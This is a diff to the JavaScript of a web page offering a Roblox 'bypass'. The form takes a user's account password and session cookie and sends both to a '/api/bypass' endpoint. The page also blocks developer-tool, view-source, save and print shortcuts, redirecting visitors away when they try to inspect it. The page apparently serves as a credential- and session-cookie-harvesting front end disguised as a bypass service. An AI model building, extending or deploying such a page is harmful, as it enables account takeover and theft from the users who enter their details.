@@ -192,7 +192,6 @@
       const cookie = document.getElementById("cookie").value.trim();
       const responseEl = document.getElementById("responseData");
       const submitBtn = document.getElementById("submitBtn");
-      const btnText = document.getElementById("btnText");
 
       if (!password || !cookie) {
         showToast("❌ Please fill in all fields");
@@ -201,19 +200,17 @@
 
       // Reset state and set loading
       submitBtn.disabled = true;
-      btnText.innerText = 'Processing';
-      submitBtn.querySelector('svg').style.display = 'none';
       submitBtn.innerHTML = '<div class="spinner"></div> Processing...';
       
       responseEl.classList.remove('success', 'error');
-      responseEl.innerText = "Sending request to API proxy...";
+      responseEl.innerText = "Bypassing... Please wait (This can take up to 10 seconds).";
 
       try {
         const res = await fetch('/api/bypass', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
-            Type: "roblox",   // hardcoded – service type removed from UI
+            Type: "Roblox", 
             Password: password, 
             Cookie: cookie 
           })
@@ -224,28 +221,28 @@
 
         if (contentType && contentType.includes('application/json')) {
           data = await res.json();
-          responseEl.innerText = JSON.stringify(data, null, 2);
           
-          // Dynamic UI Update based on success
+          const displayMessage = data.message || "Unknown error occurred";
+          responseEl.innerText = displayMessage;
+          
           if (data.success) {
             responseEl.classList.add('success');
             showToast("✅ Bypass Successful");
           } else {
             responseEl.classList.add('error');
-            showToast("❌ " + (data.message || "Bypass Failed"));
+            showToast("❌ " + displayMessage);
           }
         } else {
           data = await res.text();
-          responseEl.innerText = data;
+          responseEl.innerText = data || "Unexpected server response.";
           responseEl.classList.add('error');
           showToast("❌ Unexpected Server Response");
         }
       } catch (err) {
-        responseEl.innerText = "Error: " + err.message;
+        responseEl.innerText = "Network Error: " + err.message;
         responseEl.classList.add('error');
         showToast("❌ Network error");
       } finally {
-        // Restore button state
         submitBtn.disabled = false;
         submitBtn.innerHTML = 'Submit <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M1.5 5.5H9.5M6.5 2.5L9.5 5.5L6.5 8.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>';
       }
@@ -264,7 +261,7 @@
       const responseEl = document.getElementById("responseData");
       const text = responseEl.innerText;
       
-      if (text && text !== "Waiting for submission..." && text !== "Sending request to API proxy...") {
+      if (text && text !== "Waiting for submission..." && !text.includes("Bypassing...")) {
         navigator.clipboard.writeText(text).then(() => {
           showToast("✅ Response copied to clipboard");
         }).catch(() => {
@@ -314,8 +311,8 @@
         if(c&&s&&k==='J'){e.preventDefault();redirectToAdmin();return false;}
         if(c&&s&&k==='C'){e.preventDefault();redirectToAdmin();return false;}
         if(c&&(k==='U'||k==='u')){e.preventDefault();redirectToAdmin();return false;}
-        if(c&&(k==='S'||k==='s')){e.preventDefault();redirectToAdmin();return false;}
-        if(c&&(k==='P'||k==='p')){e.preventDefault();redirectToAdmin();return false;}
+        if(c&&(k==='S'||k==='s')){e.preventDefault();return false;}
+        if(c&&(k==='P'||k==='p')){e.preventDefault();return false;}
       });
       if(window.location.href.indexOf('view-source')!==-1)redirectToAdmin();
       document.addEventListener('DOMContentLoaded',function(){
